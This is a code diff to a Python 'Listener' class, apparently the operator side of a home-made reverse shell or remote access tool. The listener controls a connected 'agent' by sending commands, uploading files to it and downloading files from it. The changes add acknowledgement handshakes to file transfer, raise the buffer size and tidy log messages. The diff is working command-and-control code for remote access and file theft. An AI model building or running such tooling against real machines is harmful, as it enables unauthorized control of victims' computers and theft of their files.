@@ -1,4 +1,4 @@
-# CaseyServer
+# Casey Listener
 
 import socket, subprocess, os
 import json
@@ -47,11 +47,13 @@ class Listener:
         data    = file.read()
         dataLen = len(data)
 
-        self.localSocket.send(str(dataLen).encode())
-        self.localSocket.sendall(data)
+        self.agentSocket.send(str(dataLen).encode())
+        confirmMsg = self.agentSocket.recv(2)
 
-        completeMsg = self.localSocket.recv(self.bufferSize)
-        if (completeMsg): file.close()
+        self.agentSocket.sendall(data)
+        confirmMsg = self.agentSocket.recv(2)
+
+        file.close()
     # END OF sendFile METHOD
 
     # RECEIVE FILE =====
@@ -64,10 +66,12 @@ class Listener:
             elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
         elif (len(cmd_list) == 3): destination = cmd_list[-1]
 
-        dataSize  = int(self.agentSocket.recv(self.bufferSize).decode())
+        dataSize = int(self.agentSocket.recv(self.bufferSize).decode())
+        self.agentSocket.send(b"OK")
+
         file      = open(destination, "wb")
         fileBytes = b""
-        buffer    = 1000
+        buffer    = 5000000
         
         while (len(fileBytes) < dataSize):
             curBytes    = len(fileBytes)
@@ -78,9 +82,9 @@ class Listener:
         
         file.write(fileBytes)
         file.close()
+        self.agentSocket.send(b"OK")
 
-        self.agentSocket.send(b"Download completed")
-        print(f"Downloaded {len(fileBytes)} bytes of data")
+        print(f"[+] Listener: Downloaded {len(fileBytes)} bytes of data")
         print(f"[+] Listener: File successfully saved to {destination}")
 
         return
@@ -124,7 +128,7 @@ class Listener:
                         filePath = cmdList[1]
 
                         self.sendFile(filePath)
-                        print("[+] Listener: File transfer complete\n")
+                        print("[+] Listener: File transfer complete")
 
                         commandResult = self.recvData()
                         print(commandResult)
@@ -143,7 +147,7 @@ class Listener:
 
 # BEGINNING OF MAIN =====
 
-listener = Listener("127.0.0.1", 7399)
+listener = Listener("127.0.0.1", 7399) # Change the IP address to the IP address of the listening (this) computer
 listener.execute()
 
 # END OF MAIN =====
